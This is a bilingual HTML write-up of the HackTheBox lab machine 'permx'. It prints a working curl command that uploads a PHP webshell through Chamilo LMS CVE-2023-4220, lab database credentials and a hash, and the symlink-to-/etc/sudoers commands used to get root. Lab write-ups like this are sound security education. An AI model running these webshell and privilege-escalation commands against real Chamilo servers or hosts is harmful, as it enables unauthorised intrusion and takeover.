@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>permx | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">permx</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Chamilo Learning Management System vulnerable to CVE-2023-4220, an unauthenticated file upload vulnerability that allows arbitrary file upload through the BigUpload functionality. By exploiting this vulnerability, I was able to upload a PHP webshell to the <code>/main/inc/lib/javascript/bigupload/files/</code> directory without authentication.</p>
+                    
+                    <p>After gaining initial access as <code>www-data</code>, I discovered database credentials in Chamilo's configuration file at <code>app/config/configuration.php</code>. The database password was reused by the user <code>mtz</code>, allowing horizontal privilege escalation via <code>su</code>.</p>
+                    
+                    <p>For root access, I exploited a sudo misconfiguration where the <code>mtz</code> user could execute <code>/opt/acl.sh</code> as root. This script used <code>setfacl</code> to modify file ACLs but had inadequate path validation. By creating a symlink from <code>/home/mtz/xd</code> to <code>/etc/sudoers</code>, I bypassed the path restriction and granted write permissions to <code>/etc/sudoers</code>, allowing me to add sudo privileges for <code>/bin/bash</code> and escalate to root.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Chamilo LMS unauthenticated file upload (CVE-2023-4220), password reuse, sudo privilege escalation via symlink race in ACL modification script.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target:</p>
+                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>
+
+                <p>The scan reveals two primary services: SSH on port 22 and HTTP on port 80. I add the hostname <code>permx.htb</code> to my <code>/etc/hosts</code> file to resolve the virtual hosting properly.</p>
+
+                <h2>Web Enumeration - Main Site</h2>
+                <p>Navigating to <code>http://permx.htb</code>, I find an e-learning website. During the initial enumeration, I notice the site uses jQuery version 3.4.1. According to <a href="https://security.snyk.io/package/npm/jquery/3.4.1">Snyk's vulnerability database</a>, this version is vulnerable to two different XSS vulnerabilities, though these won't be immediately useful for gaining access.</p>
+
+                <p>Running gobuster on the main domain doesn't reveal particularly interesting directories:</p>
+                <p><img src="./media/image1.png" alt="Gobuster scan results showing various directories including /css, /js, /img, and /lib" /></p>
+
+                <p>I find a <code>/lib</code> directory containing a subdirectory called <code>/wow</code>, but both directories are empty and don't contain anything exploitable.</p>
+
+                <h2>Subdomain Discovery</h2>
+                <p>Having exhausted the main domain, I perform subdomain enumeration and have more success:</p>
+                <p><img src="./media/image5.png" alt="Subdomain enumeration results showing lms.permx.htb subdomain" /></p>
+
+                <p>I discover the subdomain <code>lms.permx.htb</code>, which I add to my <code>/etc/hosts</code> file and navigate to.</p>
+
+                <h2>LMS Portal Discovery</h2>
+                <p>The subdomain hosts a small learning management portal:</p>
+                <p><img src="./media/image3.png" alt="Chamilo LMS login page showing administrator information and powered by Chamilo footer" /></p>
+
+                <p>At the footer of the page, I find valuable information:</p>
+                <ul>
+                    <li><strong>Administrator:</strong> Davis Miller</li>
+                    <li><strong>Platform:</strong> <a href="http://lms.permx.htb/">Powered by Chamilo</a> © 2025</li>
+                </ul>
+
+                <p>When hovering over the administrator's name, an email address is revealed: <code>admin@permx.htb</code>. This could be useful for password reset attempts or phishing scenarios.</p>
+
+                <h3>Directory Enumeration on LMS</h3>
+                <p>I notice that the password reset functionality uses the path <code>/main/auth</code>. Running gobuster against this path reveals additional directories:</p>
+                <p><img src="./media/image2.png" alt="Gobuster results showing various directories under /main/auth including login.php, logout.php, and other authentication-related files" /></p>
+
+                <p>While these directories provide insight into the application structure, they don't immediately yield exploitable vulnerabilities.</p>
+
+                <h2>Vulnerability Research - Chamilo CVE</h2>
+                <p>Searching for "chamilo vulnerabilities" leads me to an interesting discovery: <a href="https://www.exploit-db.com/exploits/52083">Exploit-DB 52083</a>, a relatively recent vulnerability from March 2025 affecting Chamilo LMS.</p>
+
+                <h3>Understanding CVE-2023-4220</h3>
+                <p>The vulnerability allows unauthenticated remote code execution through an arbitrary file upload flaw in the BigUpload functionality. The vulnerable endpoint is located at:</p>
+                <pre><code class="language-plaintext">http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported</code></pre>
+
+                <p>Files uploaded through this endpoint are stored at:</p>
+                <pre><code class="language-plaintext">/main/inc/lib/javascript/bigupload/files/{payload_name}</code></pre>
+
+                <p>The exploitation strategy is straightforward:</p>
+                <ol>
+                    <li>Upload a PHP webshell through the vulnerable endpoint</li>
+                    <li>Access the webshell at its known location</li>
+                    <li>Execute commands to establish a reverse shell</li>
+                </ol>
+
+                <h2>Initial Access - Exploiting File Upload</h2>
+                <p>I test the vulnerability by uploading a simple PHP webshell:</p>
+                <pre><code class="language-bash">curl -X POST "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported" \
+-F "bigUploadFile=\"<?php system(\$_GET['cmd']); ?>\";fileName=xd.php;type=application/x-php"</code></pre>
+
+                <p>The server responds with a success message:</p>
+                <pre><code class="language-plaintext">The file has successfully been uploaded.</code></pre>
+
+                <p>Confirming the vulnerability, I can now access my webshell at:</p>
+                <pre><code class="language-plaintext">http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/xd.php?cmd={command}</code></pre>
+
+                <h3>Establishing Reverse Shell</h3>
+                <p>Using the webshell, I send myself a reverse shell payload and successfully gain access to the machine as the <code>www-data</code> user.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After gaining initial access, I enumerate the system to understand the environment:</p>
+
+                <h3>User Discovery</h3>
+                <p>In <code>/home</code>, I discover a user named <code>mtz</code>, who is likely my target for privilege escalation.</p>
+
+                <h3>Interesting Files</h3>
+                <p>In <code>/opt</code>, I find a script owned by root called <code>acl.sh</code>. This could be relevant for privilege escalation if <code>mtz</code> has permissions to execute it.</p>
+
+                <h3>Database Investigation</h3>
+                <p>I notice MySQL is running locally, which makes sense as Chamilo would need database storage. I search for database credentials in Chamilo's configuration files.</p>
+
+                <h2>Credential Discovery</h2>
+                <p>Navigating to Chamilo's configuration directory at <code>app/config</code>, I find several configuration files:</p>
+                <pre><code class="language-plaintext">-rwxr-xr-x 1 www-data www-data 9381 Aug 31 2023 config.yml
+-rwxr-xr-x 1 www-data www-data 1583 Aug 31 2023 config_dev.yml
+-rwxr-xr-x 1 www-data www-data  622 Aug 31 2023 config_prod.yml</code></pre>
+
+                <p>The development and production configs reference <code>config.yml</code>, which in turn references <code>configuration.php</code> for database credentials. In this file, I discover:</p>
+                <pre><code class="language-php">// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+
+// Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;</code></pre>
+
+                <h3>Database Analysis</h3>
+                <p>I access MySQL using the discovered credentials and examine the database. In the user table, I find the admin account with a bcrypt hash and salt:</p>
+                <pre><code class="language-plaintext">Password: $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra
+Salt: awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4</code></pre>
+
+                <p>While I attempt to crack this password hash with hashcat, I realize there might be a simpler approach.</p>
+
+                <h2>Horizontal Privilege Escalation - Password Reuse</h2>
+                <p>Testing for password reuse, I try using the database password with the <code>mtz</code> user:</p>
+                <pre><code class="language-bash">su mtz</code></pre>
+
+                <p>The password <code>03F6lY3uXAP2bkW8</code> works! This is a common security issue where database credentials are reused for system user accounts. I successfully escalate to the <code>mtz</code> user and retrieve the user flag.</p>
+
+                <h2>Privilege Escalation to Root - ACL Script Exploitation</h2>
+                <p>Now operating as <code>mtz</code>, I check for sudo privileges:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output confirms that <code>mtz</code> has sudo permissions for the script I found earlier:</p>
+                <pre><code class="language-plaintext">User mtz may run the following commands on permx:
+    (root) NOPASSWD: /opt/acl.sh</code></pre>
+
+                <h3>Analyzing the ACL Script</h3>
+                <p>Examining the contents of <code>/opt/acl.sh</code>:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"</code></pre>
+
+                <p>The script allows modifying file Access Control Lists (ACLs) using <code>setfacl</code>. It accepts three parameters: a username, permissions, and a target file. The script has security checks that appear to restrict operations to files within <code>/home/mtz/*</code> and prevent directory traversal with <code>..</code>.</p>
+
+                <h3>Identifying the Vulnerability</h3>
+                <p>However, there's a critical flaw in the validation logic: the script checks if the target is a file with <code>[ ! -f "$target" ]</code>, but this check follows symbolic links. This means I can create a symlink within <code>/home/mtz/</code> that points to any file on the system, and the script will accept it as valid.</p>
+
+                <h3>Exploiting via Symlink</h3>
+                <p>The exploitation strategy is to modify <code>/etc/sudoers</code> to grant myself unrestricted sudo access. First, I create a symbolic link from my home directory to <code>/etc/sudoers</code>:</p>
+                <pre><code class="language-bash">ln -s /etc/sudoers /home/mtz/xd</code></pre>
+
+                <p>The symlink <code>/home/mtz/xd</code> satisfies the path restriction check (<code>/home/mtz/*</code>), and since symlinks are treated as files by the <code>-f</code> test, it passes both validation checks.</p>
+
+                <p>Now I use the ACL script to grant myself write permissions on <code>/etc/sudoers</code>:</p>
+                <pre><code class="language-bash">sudo /opt/acl.sh mtz rw /home/mtz/xd</code></pre>
+
+                <p>With write access to <code>/etc/sudoers</code>, I can add a line granting myself full sudo privileges for <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">echo "mtz ALL=(ALL) NOPASSWD: /bin/bash" >> /home/mtz/xd</code></pre>
+
+                <h3>Gaining Root Access</h3>
+                <p>Finally, I execute bash with sudo to gain root privileges:</p>
+                <pre><code class="language-bash">sudo bash</code></pre>
+
+                <p>This grants me a root shell, allowing me to retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo ejecutaba un sistema de gestión de aprendizaje Chamilo vulnerable a CVE-2023-4220, una vulnerabilidad de subida de archivos sin autenticar que permite la carga arbitraria de ficheros a través de la funcionalidad BigUpload. Explotando esta vulnerabilidad, pude subir una webshell PHP al directorio <code>/main/inc/lib/javascript/bigupload/files/</code> sin necesidad de autenticación.</p>
+                    
+                    <p>Tras obtener el acceso inicial como <code>www-data</code>, descubrí credenciales de base de datos en el archivo de configuración de Chamilo ubicado en <code>app/config/configuration.php</code>. La contraseña de la base de datos estaba siendo reutilizada por el usuario <code>mtz</code>, permitiendo una escalada de privilegios horizontal mediante <code>su</code>.</p>
+                    
+                    <p>Para obtener acceso root, exploté una mala configuración de sudo donde el usuario <code>mtz</code> podía ejecutar <code>/opt/acl.sh</code> como root. Este script usaba <code>setfacl</code> para modificar las ACLs de archivos pero tenía una validación de rutas inadecuada. Creando un enlace simbólico desde <code>/home/mtz/xd</code> hacia <code>/etc/sudoers</code>, eludí la restricción de ruta y concedí permisos de escritura sobre <code>/etc/sudoers</code>, permitiéndome añadir privilegios sudo para <code>/bin/bash</code> y escalar a root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Subida de archivos sin autenticar en Chamilo LMS (CVE-2023-4220), reutilización de contraseñas, escalada de privilegios sudo mediante carrera de condiciones con symlink en script de modificación de ACL.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en el objetivo:</p>
+                <p><img src="./media/image4.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>
+
+                <p>El escaneo revela dos servicios principales: SSH en el puerto 22 y HTTP en el puerto 80. Añado el hostname <code>permx.htb</code> a mi archivo <code>/etc/hosts</code> para resolver correctamente el virtual hosting.</p>
+
+                <h2>Enumeración Web - Sitio Principal</h2>
+                <p>Navegando a <code>http://permx.htb</code>, encuentro un sitio web de e-learning. Durante la enumeración inicial, noto que el sitio usa jQuery versión 3.4.1. Según la <a href="https://security.snyk.io/package/npm/jquery/3.4.1">base de datos de vulnerabilidades de Snyk</a>, esta versión es vulnerable a dos vulnerabilidades XSS diferentes, aunque no serán inmediatamente útiles para obtener acceso.</p>
+
+                <p>Ejecutando gobuster sobre el dominio principal no revela directorios particularmente interesantes:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de gobuster mostrando varios directorios incluyendo /css, /js, /img y /lib" /></p>
+
+                <p>Encuentro un directorio <code>/lib</code> que contiene un subdirectorio llamado <code>/wow</code>, pero ambos directorios están vacíos y no contienen nada explotable.</p>
+
+                <h2>Descubrimiento de Subdominios</h2>
+                <p>Habiendo agotado el dominio principal, realizo enumeración de subdominios y tengo más éxito:</p>
+                <p><img src="./media/image5.png" alt="Resultados de enumeración de subdominios mostrando el subdominio lms.permx.htb" /></p>
+
+                <p>Descubro el subdominio <code>lms.permx.htb</code>, que añado a mi archivo <code>/etc/hosts</code> y al que navego.</p>
+
+                <h2>Descubrimiento del Portal LMS</h2>
+                <p>El subdominio aloja un pequeño portal de gestión de aprendizaje:</p>
+                <p><img src="./media/image3.png" alt="Página de inicio de sesión de Chamilo LMS mostrando información del administrador y el pie de página powered by Chamilo" /></p>
+
+                <p>En el pie de página, encuentro información valiosa:</p>
+                <ul>
+                    <li><strong>Administrador:</strong> Davis Miller</li>
+                    <li><strong>Plataforma:</strong> <a href="http://lms.permx.htb/">Powered by Chamilo</a> © 2025</li>
+                </ul>
+
+                <p>Al pasar el ratón sobre el nombre del administrador, se revela una dirección de correo electrónico: <code>admin@permx.htb</code>. Esto podría ser útil para intentos de restablecimiento de contraseña o escenarios de phishing.</p>
+
+                <h3>Enumeración de Directorios en el LMS</h3>
+                <p>Noto que la funcionalidad de restablecimiento de contraseña usa la ruta <code>/main/auth</code>. Ejecutando gobuster contra esta ruta revela directorios adicionales:</p>
+                <p><img src="./media/image2.png" alt="Resultados de gobuster mostrando varios directorios bajo /main/auth incluyendo login.php, logout.php y otros archivos relacionados con la autenticación" /></p>
+
+                <p>Aunque estos directorios proporcionan información sobre la estructura de la aplicación, no revelan inmediatamente vulnerabilidades explotables.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE de Chamilo</h2>
+                <p>Buscando "chamilo vulnerabilities" encuentro un descubrimiento interesante: <a href="https://www.exploit-db.com/exploits/52083">Exploit-DB 52083</a>, una vulnerabilidad relativamente reciente de marzo de 2025 que afecta a Chamilo LMS.</p>
+
+                <h3>Entendiendo CVE-2023-4220</h3>
+                <p>La vulnerabilidad permite la ejecución remota de código sin autenticación mediante un fallo de subida arbitraria de archivos en la funcionalidad BigUpload. El endpoint vulnerable está ubicado en:</p>
+                <pre><code class="language-plaintext">http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported</code></pre>
+
+                <p>Los archivos subidos a través de este endpoint se almacenan en:</p>
+                <pre><code class="language-plaintext">/main/inc/lib/javascript/bigupload/files/{payload_name}</code></pre>
+
+                <p>La estrategia de explotación es directa:</p>
+                <ol>
+                    <li>Subir una webshell PHP a través del endpoint vulnerable</li>
+                    <li>Acceder a la webshell en su ubicación conocida</li>
+                    <li>Ejecutar comandos para establecer una reverse shell</li>
+                </ol>
+
+                <h2>Acceso Inicial - Explotando Subida de Archivos</h2>
+                <p>Pruebo la vulnerabilidad subiendo una webshell PHP simple:</p>
+                <pre><code class="language-bash">curl -X POST "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported" \
+-F "bigUploadFile=\"<?php system(\$_GET['cmd']); ?>\";fileName=xd.php;type=application/x-php"</code></pre>
+
+                <p>El servidor responde con un mensaje de éxito:</p>
+                <pre><code class="language-plaintext">The file has successfully been uploaded.</code></pre>
+
+                <p>Confirmando la vulnerabilidad, ahora puedo acceder a mi webshell en:</p>
+                <pre><code class="language-plaintext">http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/xd.php?cmd={comando}</code></pre>
+
+                <h3>Estableciendo Reverse Shell</h3>
+                <p>Usando la webshell, me envío un payload de reverse shell y obtengo exitosamente acceso a la máquina como usuario <code>www-data</code>.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras obtener el acceso inicial, enumero el sistema para entender el entorno:</p>
+
+                <h3>Descubrimiento de Usuarios</h3>
+                <p>En <code>/home</code>, descubro un usuario llamado <code>mtz</code>, que probablemente sea mi objetivo para la escalada de privilegios.</p>
+
+                <h3>Archivos Interesantes</h3>
+                <p>En <code>/opt</code>, encuentro un script propiedad de root llamado <code>acl.sh</code>. Esto podría ser relevante para la escalada de privilegios si <code>mtz</code> tiene permisos para ejecutarlo.</p>
+
+                <h3>Investigación de Base de Datos</h3>
+                <p>Noto que MySQL está ejecutándose localmente, lo cual tiene sentido ya que Chamilo necesitaría almacenamiento en base de datos. Busco credenciales de base de datos en los archivos de configuración de Chamilo.</p>
+
+                <h2>Descubrimiento de Credenciales</h2>
+                <p>Navegando al directorio de configuración de Chamilo en <code>app/config</code>, encuentro varios archivos de configuración:</p>
+                <pre><code class="language-plaintext">-rwxr-xr-x 1 www-data www-data 9381 Aug 31 2023 config.yml
+-rwxr-xr-x 1 www-data www-data 1583 Aug 31 2023 config_dev.yml
+-rwxr-xr-x 1 www-data www-data  622 Aug 31 2023 config_prod.yml</code></pre>
+
+                <p>Las configuraciones de desarrollo y producción referencian <code>config.yml</code>, que a su vez referencia <code>configuration.php</code> para las credenciales de base de datos. En este archivo, descubro:</p>
+                <pre><code class="language-php">// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+
+// Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;</code></pre>
+
+                <h3>Análisis de Base de Datos</h3>
+                <p>Accedo a MySQL usando las credenciales descubiertas y examino la base de datos. En la tabla de usuarios, encuentro la cuenta admin con un hash bcrypt y salt:</p>
+                <pre><code class="language-plaintext">Password: $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra
+Salt: awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4</code></pre>
+
+                <p>Aunque intento crackear este hash de contraseña con hashcat, me doy cuenta de que podría haber un enfoque más simple.</p>
+
+                <h2>Escalada de Privilegios Horizontal - Reutilización de Contraseña</h2>
+                <p>Probando la reutilización de contraseñas, intento usar la contraseña de la base de datos con el usuario <code>mtz</code>:</p>
+                <pre><code class="language-bash">su mtz</code></pre>
+
+                <p>¡La contraseña <code>03F6lY3uXAP2bkW8</code> funciona! Este es un problema de seguridad común donde las credenciales de base de datos se reutilizan para cuentas de usuario del sistema. Escalo exitosamente al usuario <code>mtz</code> y recupero la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios a Root - Explotación del Script ACL</h2>
+                <p>Ahora operando como <code>mtz</code>, compruebo los privilegios sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida confirma que <code>mtz</code> tiene permisos sudo para el script que encontré anteriormente:</p>
+                <pre><code class="language-plaintext">User mtz may run the following commands on permx:
+    (root) NOPASSWD: /opt/acl.sh</code></pre>
+
+                <h3>Analizando el Script ACL</h3>
+                <p>Examinando el contenido de <code>/opt/acl.sh</code>:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"</code></pre>
+
+                <p>El script permite modificar Listas de Control de Acceso (ACLs) de archivos usando <code>setfacl</code>. Acepta tres parámetros: un nombre de usuario, permisos y un archivo objetivo. El script tiene comprobaciones de seguridad que aparentan restringir operaciones a archivos dentro de <code>/home/mtz/*</code> y prevenir el traversal de directorios con <code>..</code>.</p>
+
+                <h3>Identificando la Vulnerabilidad</h3>
+                <p>Sin embargo, hay un fallo crítico en la lógica de validación: el script comprueba si el objetivo es un archivo con <code>[ ! -f "$target" ]</code>, pero esta comprobación sigue los enlaces simbólicos. Esto significa que puedo crear un symlink dentro de <code>/home/mtz/</code> que apunte a cualquier archivo del sistema, y el script lo aceptará como válido.</p>
+
+                <h3>Explotación mediante Symlink</h3>
+                <p>La estrategia de explotación consiste en modificar <code>/etc/sudoers</code> para concederme acceso sudo sin restricciones. Primero, creo un enlace simbólico desde mi directorio home hacia <code>/etc/sudoers</code>:</p>
+                <pre><code class="language-bash">ln -s /etc/sudoers /home/mtz/xd</code></pre>
+
+                <p>El symlink <code>/home/mtz/xd</code> satisface la comprobación de restricción de ruta (<code>/home/mtz/*</code>), y como los symlinks son tratados como archivos por la prueba <code>-f</code>, pasa ambas validaciones.</p>
+
+                <p>Ahora uso el script ACL para concederme permisos de escritura sobre <code>/etc/sudoers</code>:</p>
+                <pre><code class="language-bash">sudo /opt/acl.sh mtz rw /home/mtz/xd</code></pre>
+
+                <p>Con acceso de escritura a <code>/etc/sudoers</code>, puedo añadir una línea concediéndome privilegios sudo completos para <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">echo "mtz ALL=(ALL) NOPASSWD: /bin/bash" >> /home/mtz/xd</code></pre>
+
+                <h3>Obteniendo Acceso Root</h3>
+                <p>Finalmente, ejecuto bash con sudo para obtener privilegios root:</p>
+                <pre><code class="language-bash">sudo bash</code></pre>
+
+                <p>Esto me concede una shell de root, permitiéndome recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
